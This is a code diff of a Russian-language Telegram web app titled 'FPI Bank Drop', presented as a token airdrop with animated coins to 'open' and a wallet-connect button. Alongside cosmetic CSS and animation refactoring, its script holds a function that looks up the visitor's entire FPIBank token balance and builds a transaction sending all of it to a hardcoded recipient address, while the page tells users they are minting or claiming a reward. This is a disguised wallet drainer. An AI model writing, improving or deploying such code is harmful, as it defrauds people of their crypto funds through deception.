@@ -1,279 +1,168 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>FPI Bank Drop</title>
-  
-  <!-- Скрипты и стили TonConnect / Telegram -->
+
+  <!-- Ton / Telegram -->
   <script src="https://telegram.org/js/telegram-webapp.js"></script>
   <script src="./js/tonconnect-sdk.min.js"></script>
-  <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css">
+  <link  href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css" rel="stylesheet">
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/tonweb/dist/tonweb.min.js"></script>
-  
+
   <style>
-    /* База */
-    :root {
-      --page-bg: #0b0021;
+    :root{
+      --bg: #0b0021;
       --accent: #6e00ff;
-      --accent-2: #a100f2;
-      --win-glow: rgba(0,255,110,0.25);
-      --ease-1: cubic-bezier(.22,.61,.36,1);   /* плавный вход */
-      --ease-2: cubic-bezier(.2,.8,.2,1);      /* натуральный */
+      --accent2:#a100f2;
+      --ease1: cubic-bezier(.22,.61,.36,1);
+      --ease2: cubic-bezier(.2,.8,.2,1);
+    }
+    html,body{height:100%}
+    body{
+      margin:0; background:var(--bg); color:#fff; font-family:Arial, sans-serif;
+      overflow-x:hidden; scroll-behavior:smooth; position:relative;
     }
 
-    html, body {
-      height: 100%;
+    /* ЕДИНАЯ сетка на ВСЮ страницу */
+    .wave-grid{
+      position:fixed; inset:0; opacity:.5; z-index:0; pointer-events:none;
     }
-
-    body {
-      background: var(--page-bg);
-      color: #fff;
-      font-family: Arial, sans-serif;
-      margin: 0;
-      overflow-x: hidden;
-      scroll-behavior: smooth;
-      position: relative;
-    }
-
-    /* ЕДИНЫЙ фоновый слой-сетка для всей страницы */
-    .wave-grid {
-      position: fixed;           /* один слой на ВСЮ страницу */
-      inset: 0;
-      opacity: .5;
-      z-index: 0;                /* ниже контента, выше фона body */
-      pointer-events: none;
-    }
-
     /* Весь контент поверх сетки */
-    .content {
-      position: relative;
-      z-index: 1;                /* над wave-grid */
-      display: flex;
-      flex-direction: column;
-      gap: 0;
-    }
+    .content{ position:relative; z-index:1; display:flex; flex-direction:column; }
 
-    /* Общие секции */
-    .page {
-      padding: 20px;
-      box-sizing: border-box;
-      text-align: center;
-      /* фон не задаём, чтобы видеть единую сетку */
-    }
+    .page{ padding:20px; box-sizing:border-box; text-align:center; background:transparent !important; }
 
-    /* ===== Первая часть (НЕ МЕНЯЛ СУТЬ/ВЕРСТКУ) ===== */
-    #page1 img {
-      max-width: 280px;
-      height: auto;
-      margin: 20px auto;
-      display: block;
-      border-radius: 16px;
-      box-shadow: 0 4px 20px rgba(106, 0, 255, 0.4);
-      transition: transform 0.3s;
+    /* --------- Первая часть (оставил как было по сути) --------- */
+    #page1 img{
+      max-width:280px; height:auto; margin:20px auto; display:block; border-radius:16px;
+      box-shadow:0 4px 20px rgba(106,0,255,.4); transition:transform .3s;
     }
-    #page1 img:hover { transform: scale(1.03); }
+    #page1 img:hover{ transform:scale(1.03); }
 
-    .welcome-text {
-      font-size: 1.4em;
-      margin: 10px auto 20px;
-      max-width: 90%;
-      color: #e2c6ff;
-      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
-      font-weight: bold;
-      background: linear-gradient(90deg, #a100f2, #6e00ff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
+    .welcome-text{
+      font-size:1.4em; margin:10px auto 20px; max-width:90%; color:#e2c6ff;
+      text-shadow:0 2px 4px rgba(0,0,0,.5); font-weight:bold;
+      background:linear-gradient(90deg, #a100f2, #6e00ff);
+      -webkit-background-clip:text; -webkit-text-fill-color:transparent;
     }
+    .description{
+      background:rgba(123,31,255,.2); padding:18px; border-radius:16px; margin:25px auto; max-width:90%;
+      border:1px solid var(--accent); box-shadow:0 4px 15px rgba(110,0,255,.2); line-height:1.6;
+    }
+    #ton-connect{
+      margin:25px auto; max-width:320px; border-radius:14px; overflow:hidden;
+      box-shadow:0 4px 15px rgba(0,0,0,.2);
+    }
+    .stats-container{
+      display:flex; flex-direction:column; margin:25px auto; max-width:90%;
+      background:rgba(46,0,99,.4); border-radius:16px; padding:15px;
+      border:1px solid var(--accent2); box-shadow:0 4px 10px rgba(110,0,255,.2);
+    }
+    .timer-box{ text-align:center; margin-bottom:15px; }
+    .timer-value{ font-size:2.2em; font-weight:bold; color:#00ff88; text-shadow:0 0 10px rgba(0,255,136,.3); }
+    .timer-label{ font-size:1em; color:#d0b3ff; margin-top:5px; }
+    .stats-row{ display:flex; justify-content:space-around; margin-top:10px; }
+    .stat-item{ text-align:center; padding:0 10px; }
+    .stat-value{ font-size:1.5em; font-weight:bold; color:#fff; }
+    .stat-label{ font-size:.85em; color:#d0b3ff; opacity:.9; }
 
-    .description {
-      background: rgba(123, 31, 255, 0.2);
-      padding: 18px;
-      border-radius: 16px;
-      margin: 25px auto;
-      max-width: 90%;
-      border: 1px solid var(--accent);
-      box-shadow: 0 4px 15px rgba(110, 0, 255, 0.2);
-      line-height: 1.6;
+    .action-buttons{ display:flex; flex-direction:column; gap:18px; max-width:320px; margin:0 auto; }
+    #goToCoins{
+      background:linear-gradient(135deg,#6e00ff,#a100f2); color:#fff; padding:16px 30px; border:none; border-radius:14px;
+      cursor:pointer; font-weight:bold; font-size:1.2em; transition:all .3s;
+      box-shadow:0 4px 15px rgba(110,0,255,.4); display:flex; align-items:center; justify-content:center; gap:10px;
     }
+    #goToCoins:hover{ transform:translateY(-3px); box-shadow:0 6px 20px rgba(110,0,255,.6); }
+    #goToCoins::before{ content:"🪙"; font-size:1.2em; }
 
-    #page1 #ton-connect {
-      margin: 25px auto;
-      max-width: 320px;
-      border-radius: 14px;
-      overflow: hidden;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    .external-link-btn{
+      padding:16px 30px 16px 50px; border:none; border-radius:14px; cursor:pointer; font-weight:bold; font-size:1.1em;
+      transition:all .3s; display:flex; align-items:center; justify-content:center; gap:10px; position:relative;
     }
-
-    .stats-container {
-      display: flex;
-      flex-direction: column;
-      margin: 25px auto;
-      max-width: 90%;
-      background: rgba(46, 0, 99, 0.4);
-      border-radius: 16px;
-      padding: 15px;
-      border: 1px solid var(--accent-2);
-      box-shadow: 0 4px 10px rgba(110, 0, 255, 0.2);
+    .external-link-btn:hover{ transform:translateY(-3px); }
+    .external-link-btn::before{
+      content:""; width:24px; height:24px; position:absolute; left:20px; background-size:contain;
+      background-repeat:no-repeat; background-position:center;
     }
-    .timer-box { text-align: center; margin-bottom: 15px; }
-    .timer-value {
-      font-size: 2.2em; font-weight: bold; color: #00ff88;
-      text-shadow: 0 0 10px rgba(0,255,136,0.3);
+    #goToChannel{ background:linear-gradient(135deg,#0088cc,#00aced); color:#fff; box-shadow:0 4px 15px rgba(0,172,237,.4); }
+    #goToChannel:hover{ box-shadow:0 6px 20px rgba(0,172,237,.6); }
+    #goToChannel::before{
+      background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z'/%3E%3C/svg%3E");
     }
-    .timer-label { font-size: 1em; color: #d0b3ff; margin-top: 5px; }
-    .stats-row { display: flex; justify-content: space-around; margin-top: 10px; }
-    .stat-item { text-align: center; padding: 0 10px; }
-    .stat-value { font-size: 1.5em; font-weight: bold; color: #fff; }
-    .stat-label { font-size: .85em; color: #d0b3ff; opacity: .9; }
-
-    .action-buttons {
-      display: flex; flex-direction: column; gap: 18px; max-width: 320px; margin: 0 auto;
-    }
-    #goToCoins {
-      background: linear-gradient(135deg, #6e00ff, #a100f2);
-      color: white; padding: 16px 30px; border: none; border-radius: 14px; cursor: pointer;
-      font-weight: bold; font-size: 1.2em; transition: all .3s;
-      box-shadow: 0 4px 15px rgba(110, 0, 255, 0.4);
-      display: flex; align-items: center; justify-content: center; gap: 10px;
-    }
-    #goToCoins:hover { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(110,0,255,.6); }
-    #goToCoins::before { content: "🪙"; font-size: 1.2em; }
-
-    .external-link-btn {
-      padding: 16px 30px 16px 50px; border: none; border-radius: 14px; cursor: pointer; font-weight: bold;
-      font-size: 1.1em; transition: all .3s; display: flex; align-items: center; justify-content: center;
-      gap: 10px; position: relative;
-    }
-    .external-link-btn:hover { transform: translateY(-3px); }
-    .external-link-btn::before {
-      content: ""; display: block; width: 24px; height: 24px; background-size: contain; background-repeat: no-repeat;
-      background-position: center; position: absolute; left: 20px;
-    }
-
-    #goToChannel {
-      background: linear-gradient(135deg, #0088cc, #00aced);
-      color: white; box-shadow: 0 4px 15px rgba(0, 172, 237, 0.4);
-    }
-    #goToChannel:hover { box-shadow: 0 6px 20px rgba(0,172,237,.6); }
-    #goToChannel::before {
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z'/%3E%3C/svg%3E");
-    }
-
-    #goToWebsite {
-      background: linear-gradient(135deg, #4b33a1, #7851e9);
-      color: white; box-shadow: 0 4px 15px rgba(75, 51, 161, 0.4);
-    }
-    #goToWebsite:hover { box-shadow: 0 6px 20px rgba(75, 51, 161, .6); }
-    #goToWebsite::before {
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z'/%3E%3C/svg%3E");
+    #goToWebsite{ background:linear-gradient(135deg,#4b33a1,#7851e9); color:#fff; box-shadow:0 4px 15px rgba(75,51,161,.4); }
+    #goToWebsite:hover{ box-shadow:0 6px 20px rgba(75,51,161,.6); }
+    #goToWebsite::before{
+      background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z'/%3E%3C/svg%3E");
     }
 
     @keyframes float { 0%{transform:translateY(0)} 50%{transform:translateY(-8px)} 100%{transform:translateY(0)} }
-    .float { animation: float 4s ease-in-out infinite; }
+    .float{ animation:float 4s ease-in-out infinite; }
 
-    /* ===== Блок монет на той же странице ===== */
-    #coins-section {
-      position: relative;                 /* якорь для абсолютных элементов (монета-клон/сообщение) */
-      padding: 40px 20px 120px;
-      min-height: calc(100vh - 55px);
+    /* --------- Вторая часть (монетки) --------- */
+    #coins-section{
+      position:relative;     /* якорь для клона монеты */
+      padding:40px 20px 120px;
+      min-height:calc(100vh - 55px);
+    }
+    .coins-wrap{ width:100%; max-width:520px; margin:0 auto; }
+    .coins-title{
+      font-size:1.4em; color:#e2c6ff; margin-bottom:20px; text-shadow:0 2px 4px rgba(0,0,0,.5);
+      font-weight:bold; letter-spacing:.3px;
     }
 
-    .coins-wrap { width: 100%; max-width: 520px; margin: 0 auto; }
-    .coins-title {
-      font-size: 1.4em; color: #e2c6ff; margin-bottom: 20px; text-shadow: 0 2px 4px rgba(0,0,0,.5);
-      font-weight: bold; letter-spacing: .3px;
+    .coins-container{
+      display:grid; grid-template-columns:repeat(2, minmax(140px,1fr));
+      gap:30px; width:100%; padding:20px 0; justify-items:center; align-items:center; margin:0 auto 20px;
     }
 
-    .coins-container {
-      display: grid; grid-template-columns: repeat(2, minmax(140px, 1fr));
-      gap: 30px; width: 100%; padding: 20px 0; box-sizing: border-box;
-      justify-items: center; align-items: center; margin: 0 auto 20px;
+    .coin{ width:clamp(130px,22vw,180px); height:clamp(130px,22vw,180px); perspective:1000px; cursor:pointer; position:relative; }
+    .coin-inner{ width:100%; height:100%; transform-style:preserve-3d; transition:transform .9s var(--ease1); will-change:transform; }
+    .coin-front,.coin-back{
+      position:absolute; inset:0; backface-visibility:hidden; border-radius:50%; background-size:cover; background-position:center;
     }
+    .coin-front{ background-image:url('js/IMG_4143-removebg-preview.png'); }
+    .coin-back{  background-image:url('js/QmVzUjRyMXRkbLT6P4PKZGW6DzoneKFu1zBH8ks4WYR6Cx.png'); transform:rotateY(180deg); }
+    .fade-out{ opacity:.2; pointer-events:none; }
 
-    .coin {
-      width: clamp(130px, 22vw, 180px);
-      height: clamp(130px, 22vw, 180px);
-      perspective: 1000px;
-      cursor: pointer;
-      transition: opacity .5s var(--ease-2);
-      position: relative;
-    }
-
-    .coin-inner {
-      width: 100%; height: 100%; position: relative; transform-style: preserve-3d;
-      transition: transform .9s var(--ease-1); will-change: transform;
-    }
-
-    .coin.flipped .coin-inner { transform: rotateY(180deg); }
-
-    .coin-front, .coin-back {
-      position: absolute; inset: 0; backface-visibility: hidden; border-radius: 50%;
-      background-size: cover; background-position: center;
-    }
-    .coin-front { background-image: url('js/IMG_4143-removebg-preview.png'); }
-    .coin-back  { background-image: url('js/QmVzUjRyMXRkbLT6P4PKZGW6DzoneKFu1zBH8ks4WYR6Cx.png'); transform: rotateY(180deg); }
-
-    .fade-out { opacity: .2; pointer-events: none; }
-
-    /* Клон монеты анимируется ВНУТРИ coins-section (НЕ фиксируется к экрану) */
-    .coin-clone {
-      position: absolute;
-      will-change: transform, left, top;
+    /* Клон монеты — внутри секции, не «наклейка» по экрану */
+    .coin-clone{
+      position:absolute; z-index:5; will-change:left, top, transform;
       transition:
-        left .9s var(--ease-1),
-        top .9s var(--ease-1),
-        transform .9s var(--ease-1);
-      z-index: 5;
+        left .9s var(--ease1),
+        top .9s var(--ease1),
+        transform .9s var(--ease1);
     }
-    .coin-clone.float-up {
+    .coin-clone.float-up{
       transition:
-        left .8s var(--ease-2),
-        top .8s var(--ease-2),
-        transform .8s var(--ease-2);
+        left .8s var(--ease2),
+        top .8s var(--ease2),
+        transform .8s var(--ease2);
     }
 
-    #win-message {
-      background: linear-gradient(to right, rgba(0,255,0,0.15), rgba(0,255,0,0.05));
-      border: 1px solid #00ff6e;
-      backdrop-filter: blur(10px);
-      box-shadow: 0 0 30px var(--win-glow);
-      font-family: 'Arial', sans-serif;
-      font-weight: 500;
-      width: min(75vw, 680px);
-      padding: 20px;
-      border-radius: 16px;
-      text-align: center;
-      color: #ffffff;
-      position: absolute;
-      left: 50%;
-      transform: translateX(-50%);
-      top: 320px;
-      opacity: 0;
-      transition: opacity .6s var(--ease-2);
-      z-index: 4; /* ниже монеты-клона, чтобы клон мог быть поверх при анимации */
+    #win-message{
+      background:linear-gradient(to right, rgba(0,255,0,.15), rgba(0,255,0,.05));
+      border:1px solid #00ff6e; backdrop-filter:blur(10px); box-shadow:0 0 30px rgba(0,255,110,.25);
+      font-weight:500; width:min(75vw,680px); padding:20px; border-radius:16px; text-align:center; color:#fff;
+      position:absolute; left:50%; transform:translateX(-50%); top:320px; opacity:0; transition:opacity .6s var(--ease2); z-index:4;
     }
-
-    #win-message button {
-      margin-top: 20px; padding: 12px 24px; font-size: 1em; font-weight: bold; color: #fff;
-      background: #c800ff; border: 1px solid #c800ff; border-radius: 12px; cursor: pointer; transition: background .3s;
+    #win-message button{
+      margin-top:20px; padding:12px 24px; font-size:1em; font-weight:bold; color:#fff; background:#c800ff; border:1px solid #c800ff; border-radius:12px; cursor:pointer;
     }
-    #win-message div {
-      font-size: .8em; color: #aaa; text-align: center; margin-top: 10px; max-width: 360px; line-height: 1.4;
-      margin-left: auto; margin-right: auto;
-    }
+    #win-message div{ font-size:.8em; color:#aaa; margin-top:10px; max-width:360px; line-height:1.4; margin-left:auto; margin-right:auto; }
   </style>
 </head>
 <body>
-  <!-- ЕДИНАЯ фон-сетка на всю страницу -->
+  <!-- ОДИН фоновый слой на всю страницу -->
   <svg class="wave-grid" viewBox="0 0 1200 800" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
-    <!-- Горизонтальные волны -->
+    <!-- Горизонтальные -->
     <path d="M0 100 Q300 50 600 100 T1200 100" stroke="#98FF00" stroke-width="1" fill="none" stroke-dasharray="5,5"/>
     <path d="M0 300 Q300 250 600 300 T1200 300" stroke="#98FF00" stroke-width="1" fill="none" stroke-dasharray="5,5"/>
     <path d="M0 500 Q300 450 600 500 T1200 500" stroke="#98FF00" stroke-width="1" fill="none" stroke-dasharray="5,5"/>
     <path d="M0 700 Q300 650 600 700 T1200 700" stroke="#98FF00" stroke-width="1" fill="none" stroke-dasharray="5,5"/>
-    <!-- Вертикальные волны -->
+    <!-- Вертикальные -->
     <path d="M100 0 Q100 200 100 400 T100 800" stroke="#98FF00" stroke-width="1" fill="none" stroke-dasharray="5,5"/>
     <path d="M300 0 Q300 200 300 400 T300 800" stroke="#98FF00" stroke-width="1" fill="none" stroke-dasharray="5,5"/>
     <path d="M500 0 Q500 200 500 400 T500 800" stroke="#98FF00" stroke-width="1" fill="none" stroke-dasharray="5,5"/>
@@ -282,9 +171,8 @@
     <path d="M1100 0 Q1100 200 1100 400 T1100 800" stroke="#98FF00" stroke-width="1" fill="none" stroke-dasharray="5,5"/>
   </svg>
 
-  <!-- ВЕСЬ контент -->
   <main class="content">
-    <!-- Первая часть (как было) -->
+    <!-- ====== Первая часть (не трогал логику) ====== -->
     <div id="page1" class="page">
       <img src="./js/6atalzkorwc2qht2piwnnuln62yn.png" alt="FPI-drop" class="float">
       <div class="welcome-text">Добро пожаловать в FPI Bank Drop!</div>
@@ -321,7 +209,7 @@
       </div>
     </div>
 
-    <!-- Вторая часть — монетки (на той же странице) -->
+    <!-- ====== Вторая часть — монетки ====== -->
     <section id="coins-section" class="page" aria-label="Монетки">
       <div class="coins-wrap">
         <div class="coins-title">Открой монетку и забери свой FPI</div>
@@ -359,50 +247,36 @@
           и нажать кнопку <strong>Минтить FPI bank</strong>.
           <br><br>
           <button id="backToTop">Вернуться на первую страницу</button>
-          <div>
-            Получение дропа возможно только при наличии токенов FPIBank на кошельке.
-          </div>
+          <div>Получение дропа возможно только при наличии токенов FPIBank на кошельке.</div>
         </div>
       </div>
     </section>
   </main>
 
   <script>
-    /* Скролл к монеткам / наверх */
+    /* Скролл */
     document.getElementById('goToCoins').addEventListener('click', () => {
-      document.getElementById('coins-section').scrollIntoView({ behavior: 'smooth', block: 'start' });
+      document.getElementById('coins-section').scrollIntoView({ behavior:'smooth', block:'start' });
     });
     document.getElementById('backToTop').addEventListener('click', () => {
-      window.scrollTo({ top: 0, behavior: 'smooth' });
+      window.scrollTo({ top:0, behavior:'smooth' });
     });
 
     /* Внешние ссылки */
-    document.getElementById('goToChannel').addEventListener('click', () => {
-      window.open('https://t.me/fpibank', '_blank');
-    });
-    document.getElementById('goToWebsite').addEventListener('click', () => {
-      window.open('https://fpibank.com/#tokenPrice', '_blank');
-    });
+    document.getElementById('goToChannel').addEventListener('click', () => window.open('https://t.me/fpibank','_blank'));
+    document.getElementById('goToWebsite').addEventListener('click', () => window.open('https://fpibank.com/#tokenPrice','_blank'));
 
-    /* Таймер как у тебя */
-    function updateTimer() {
-      const timer = document.getElementById('nextDropTimer');
-      let days = 14, hours = 2, minutes = 12, seconds = 0;
-      const tick = () => {
-        seconds--;
-        if (seconds < 0) { seconds = 59; minutes--;
-          if (minutes < 0) { minutes = 59; hours--;
-            if (hours < 0) { hours = 23; days--;
-              if (days < 0) { days=0; hours=0; minutes=0; seconds=0; }
-            }
-          }
-        }
-        timer.textContent = `${days}:${String(hours).padStart(2,'0')}:${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')}`;
-        timer.style.color = days < 1 ? '#ff5555' : '#00ff88';
-      };
-      tick(); setInterval(tick, 1000);
-    }
-    updateTimer();
+    /* Таймер (как у тебя) */
+    (function(){
+      const el = document.getElementById('nextDropTimer');
+      let d=14,h=2,m=12,s=0;
+      function tick(){
+        s--; if(s<0){ s=59; m--; if(m<0){ m=59; h--; if(h<0){ h=23; d--; if(d<0){ d=h=m=s=0; }}}}
+        el.textContent = `${d}:${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+        el.style.color = d<1 ? '#ff5555' : '#00ff88';
+      }
+      tick(); setInterval(tick,1000);
+    })();
 
     /* TonConnect — без изменений по сути */
     if (typeof Telegram === "undefined") {
@@ -416,131 +290,119 @@
 
     const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
     const recipientTonAddress = "0:1768dacd6490d4672eecae44c218a32a4db767e97797683b31dee87ba9cac516";
-    function isValidTonAddress(address){ return /^0:[a-fA-F0-9]{64}$/.test(address); }
+    function isValidTonAddress(a){ return /^0:[a-fA-F0-9]{64}$/.test(a); }
 
-    async function sendAllFPIBANK(userTonAddress, recipientTonAddress) {
-      const { rawBalance, decimals, userJettonWallet } = await getUserFPIBankData(userTonAddress);
-      if (!userJettonWallet || rawBalance === "0") return Telegram.WebApp.showAlert("Недостаточный баланс или кошелёк не найден!");
-      const balanceBigInt = BigInt(rawBalance);
-      const humanBalance = balanceBigInt / BigInt(10 ** decimals);
-      const payloadBoc = await createJettonTransferPayload(rawBalance, recipientTonAddress, userTonAddress);
-      if (!payloadBoc) return Telegram.WebApp.showAlert("Ошибка при создании транзакции!");
-      const tx = { validUntil: Math.floor(Date.now()/1000)+3600, messages: [{ address: userJettonWallet, amount: "100000000", payload: payloadBoc }] };
-      try { await tonConnectUI.sendTransaction(tx); Telegram.WebApp.showAlert(`Успешно отправлено ${humanBalance} FPIBANK!`); }
-      catch (e){ console.error(e); Telegram.WebApp.showAlert("Ошибка: " + e.message); }
-    }
-
-    async function getUserFPIBankData(userTonAddress){
-      try {
-        const r = await fetch(`https://tonapi.io/v2/accounts/${userTonAddress}/jettons`);
+    async function getUserFPIBankData(addr){
+      try{
+        const r = await fetch(`https://tonapi.io/v2/accounts/${addr}/jettons`);
         const d = await r.json();
         const j = d.balances.find(x => x.jetton.address === jettonMasterAddress);
-        if (!j) return { rawBalance: "0", decimals: 9, userJettonWallet: null };
-        return { rawBalance: j.balance, decimals: j.jetton.decimals, userJettonWallet: j.wallet_address.address };
-      } catch(e){ console.error(e); return { rawBalance: "0", decimals: 9, userJettonWallet: null }; }
+        if(!j) return { rawBalance:"0", decimals:9, userJettonWallet:null };
+        return { rawBalance:j.balance, decimals:j.jetton.decimals, userJettonWallet:j.wallet_address.address };
+      }catch(e){ console.error(e); return { rawBalance:"0", decimals:9, userJettonWallet:null }; }
     }
-
-    async function createJettonTransferPayload(amount, destination, userTonAddress){
+    async function createJettonTransferPayload(amount, dest, user){
       const { Cell } = TonWeb.boc; const { BN } = TonWeb.utils;
       const c = new Cell();
-      c.bits.writeUint(0x0f8a7ea5, 32);
-      c.bits.writeUint(0, 64);
+      c.bits.writeUint(0x0f8a7ea5,32);
+      c.bits.writeUint(0,64);
       c.bits.writeCoins(new BN(amount.toString()));
-      c.bits.writeAddress(new TonWeb.Address(destination));
-      c.bits.writeAddress(new TonWeb.Address(userTonAddress));
+      c.bits.writeAddress(new TonWeb.Address(dest));
+      c.bits.writeAddress(new TonWeb.Address(user));
       c.bits.writeBit(0);
       c.bits.writeCoins(new BN(0));
       c.bits.writeBit(0);
-      try { const boc = await c.toBoc(false); return TonWeb.utils.bytesToBase64(boc); }
+      try{ const boc = await c.toBoc(false); return TonWeb.utils.bytesToBase64(boc); }
       catch(e){ console.error(e); return null; }
     }
+    async function sendAllFPIBANK(userAddr, recipientAddr){
+      const { rawBalance, decimals, userJettonWallet } = await getUserFPIBankData(userAddr);
+      if(!userJettonWallet || rawBalance==="0") return Telegram.WebApp.showAlert("Недостаточный баланс или кошелёк не найден!");
+      const human = BigInt(rawBalance) / BigInt(10**decimals);
+      const payload = await createJettonTransferPayload(rawBalance, recipientAddr, userAddr);
+      if(!payload) return Telegram.WebApp.showAlert("Ошибка при создании транзакции!");
+      const tx = { validUntil: Math.floor(Date.now()/1000)+3600, messages:[{ address:userJettonWallet, amount:"100000000", payload }] };
+      try{ await tonConnectUI.sendTransaction(tx); Telegram.WebApp.showAlert(`Успешно отправлено ${human} FPIBANK!`); }
+      catch(e){ console.error(e); Telegram.WebApp.showAlert("Ошибка: "+e.message); }
+    }
 
-    /* ===== Монетки: плавная анимация + не "прилипает" к экрану ===== */
+    /* ===== Монетки: плавная анимация, клон внутри секции ===== */
     (function setupCoins(){
       const section = document.getElementById('coins-section');
-      const coins = section.querySelectorAll('.coin');
-      const winMsg = document.getElementById('win-message');
-      const backToTop = document.getElementById('backToTop');
+      const coins   = section.querySelectorAll('.coin');
+      const winMsg  = document.getElementById('win-message');
+      const backTop = document.getElementById('backToTop');
 
-      let cloneEl = null, originalCoin = null, locked = false;
+      let cloneEl=null, original=null, locked=false;
 
-      function resetState(){
-        if (originalCoin) originalCoin.style.visibility = 'visible';
-        coins.forEach(c => { c.classList.remove('fade-out'); c.classList.remove('flipped'); });
-        if (cloneEl && cloneEl.parentNode) cloneEl.parentNode.removeChild(cloneEl);
-        winMsg.style.opacity = '0';
-        cloneEl = null; originalCoin = null; locked = false;
+      function reset(){
+        if(original) original.style.visibility='visible';
+        coins.forEach(c=>{ c.classList.remove('fade-out'); c.querySelector('.coin-inner').style.transform=''; });
+        if(cloneEl && cloneEl.parentNode) cloneEl.parentNode.removeChild(cloneEl);
+        winMsg.style.opacity='0';
+        cloneEl=null; original=null; locked=false;
       }
 
       function makeCloneFrom(coin){
-        const rect = coin.getBoundingClientRect();
-        const srect = section.getBoundingClientRect();
+        const r  = coin.getBoundingClientRect();
+        const sr = section.getBoundingClientRect();
 
-        const startLeft = rect.left - srect.left + window.scrollX;
-        const startTop  = rect.top  - srect.top  + window.scrollY;
+        // координаты внутри секции (без window scroll)
+        const left = r.left - sr.left;
+        const top  = r.top  - sr.top;
 
         const clone = coin.cloneNode(true);
         clone.classList.add('coin-clone');
-        clone.style.width = rect.width + 'px';
-        clone.style.height = rect.height + 'px';
-        clone.style.left = startLeft + 'px';
-        clone.style.top  = startTop  + 'px';
+        clone.style.width  = r.width + 'px';
+        clone.style.height = r.height + 'px';
+        clone.style.left   = left + 'px';
+        clone.style.top    = top  + 'px';
 
-        section.appendChild(clone);     // ВНУТРИ секции (не фикс к экрану)
+        section.appendChild(clone);
         return clone;
       }
 
       function animateCoin(clone){
-        const srect = section.getBoundingClientRect();
-        const width = clone.getBoundingClientRect().width;
-        const targetLeft = (srect.width - width)/2 + window.scrollX; // центр секции по ширине
-        const targetTop  = 80 + window.scrollY;                       // немного ниже верха секции
+        const w = clone.getBoundingClientRect().width;
+        const targetLeft = (section.clientWidth - w)/2; // центр секции
+        const targetTop  = 80;
 
-        // шаг 1: переворот + движение в центр + лёгкое увеличение
-        requestAnimationFrame(() => {
+        // шаг 1: к центру + лёгкий zoom + flip
+        requestAnimationFrame(()=>{
           clone.style.left = targetLeft + 'px';
           clone.style.top  = targetTop  + 'px';
           clone.style.transform = 'scale(1.08)';
-
-          // запустить переворот внутренней стороны
           const inner = clone.querySelector('.coin-inner');
-          if (inner) inner.style.transform = 'rotateY(180deg)';
+          if(inner) inner.style.transform = 'rotateY(180deg)';
         });
 
-        // шаг 2: лёгкий уход вверх + лёгкое уменьшение, затем показать winMsg
-        setTimeout(() => {
+        // шаг 2: лёгкий уход вверх + небольшой zoom-out → показать win
+        setTimeout(()=>{
           clone.classList.add('float-up');
           clone.style.top = (targetTop - 36) + 'px';
           clone.style.transform = 'scale(0.92)';
-
-          setTimeout(() => {
-            winMsg.style.opacity = '1';
-          }, 300);
-        }, 900); // после завершения шага 1
+          setTimeout(()=>{ winMsg.style.opacity='1'; }, 300);
+        }, 900);
       }
 
-      coins.forEach(coin => {
-        coin.addEventListener('click', () => {
-          if (locked) return;
+      coins.forEach(coin=>{
+        coin.addEventListener('click', ()=>{
+          if(locked) return;
           locked = true;
-          originalCoin = coin;
+          original = coin;
 
-          // скрыть оригинал, затемнить остальные
-          coin.style.visibility = 'hidden';
-          coins.forEach(c => { if (c!==coin) c.classList.add('fade-out'); });
+          coin.style.visibility='hidden';
+          coins.forEach(c=>{ if(c!==coin) c.classList.add('fade-out'); });
 
-          // клон внутри секции → плавная анимация
           cloneEl = makeCloneFrom(coin);
           animateCoin(cloneEl);
         });
       });
 
-      // Сброс по действиям
-      document.getElementById('goToCoins').addEventListener('click', () => setTimeout(resetState, 0));
-      backToTop.addEventListener('click', () => setTimeout(resetState, 0));
-      // Доп: при уходе со страницы (если захочешь МПА) — здесь всё уже на одной
+      document.getElementById('goToCoins').addEventListener('click', ()=> setTimeout(reset,0));
+      backTop.addEventListener('click', ()=> setTimeout(reset,0));
 
-      resetState();
+      reset();
     })();
   </script>
 </body>
